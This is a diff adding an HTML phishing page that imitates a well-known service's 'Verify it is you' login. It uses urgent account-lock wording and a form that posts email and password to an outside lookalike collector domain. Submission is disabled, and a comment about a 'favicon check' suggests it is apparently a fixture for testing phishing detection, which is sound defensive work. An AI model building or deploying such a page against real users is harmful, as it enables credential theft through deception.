@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verify your account</title>
+  <!-- The only thing this page borrows is a well-known service's icon, which is what the favicon check looks for. -->
+  <link rel="icon" href="/favicon.png">
+  <style>
+    body { margin: 0; min-height: 100vh; display: grid; place-items: center; background: #f1f3f4; font: 15px/1.5 system-ui, sans-serif; color: #202124; }
+    .box { width: 380px; max-width: 92vw; background: #fff; border: 1px solid #dadce0; border-radius: 10px; padding: 36px 32px; }
+    img { width: 36px; height: 36px; }
+    h1 { font-size: 24px; font-weight: 400; margin: 12px 0 6px; }
+    p { margin: 0 0 18px; color: #5f6368; }
+    input { width: 100%; box-sizing: border-box; padding: 13px 12px; margin-bottom: 14px; border: 1px solid #dadce0; border-radius: 4px; font: inherit; }
+    button { float: right; padding: 10px 24px; border: 0; border-radius: 4px; background: #1a73e8; color: #fff; font: inherit; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="/favicon.png" alt="">
+    <h1>Verify it is you</h1>
+    <p>Your account was locked. Sign in again to unlock it within 24 hours.</p>
+    <form action="https://login-check.account-verify-center.cc/collect" method="post" onsubmit="return false">
+      <input name="email" type="email" placeholder="Email" autocomplete="username">
+      <input name="password" type="password" placeholder="Password" autocomplete="current-password">
+      <button type="submit">Unlock</button>
+    </form>
+  </div>
+</body>
+</html>
